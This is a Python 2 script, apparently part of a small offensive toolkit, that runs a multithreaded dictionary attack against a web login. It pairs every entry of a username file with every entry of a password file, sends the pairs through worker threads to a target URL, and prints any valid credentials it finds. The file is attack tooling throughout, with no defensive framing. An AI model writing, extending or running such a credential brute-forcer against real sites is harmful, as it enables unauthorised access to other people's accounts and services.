#!/usr/bin/env python

''' Web authentication dictionary attack tool. '''

import sys
import urlparse
import itertools
import threading
import Queue

import requests

from utils import cmd_line_args
from utils import prefix_print
from utils import abort_on_missing_file
from core import LoginThread

def main():
    args = cmd_line_args()

    abort_on_missing_file(args.passwords_file)
    abort_on_missing_file(args.usernames_file)

    #check url scheme 
    if urlparse.urlparse(args.target).scheme not in ['http', 'https']:
        prefix_print("Incorrect / missing URL scheme on target \'%s\'. "
            "Only HTTP / HTTPS are supported." % (args.target), True)

    credential_queue = Queue.Queue()
    result_queue = Queue.Queue()

    thread_pool = [LoginThread(args.target, credential_queue, result_queue) for i in range(args.threads)]

    #Fill up Queue with username, password tuples
    #I decided to fully load the Queue before starting the threads.
    #Might be better to have the threads running and consuming data as
    #the Queue is being loaded.  My worry was that the worker threads
    #would consume data from the Queue faster than the file I/O operations
    #could fill it and the threads would just be waiting on the file I/O
    with open(args.usernames_file) as uname_infile, open(args.passwords_file,
        'r') as pwd_infile:

        prefix_print("Loading word list from file...")
        for x in itertools.product(uname_infile, pwd_infile):
            credential_queue.put((x[0].rstrip(), x[1].rstrip())) 
        prefix_print("Loading complete.")

    for thread in thread_pool:
        thread.start()

    for thread in thread_pool:
        thread.join()

    if not result_queue.empty():
        username, password = result_queue.get()
        prefix_print("Valid Credentials: %s, %s" % (username, password))
    else:
        prefix_print("No valid credentials found.")

if __name__ == '__main__':
    main()
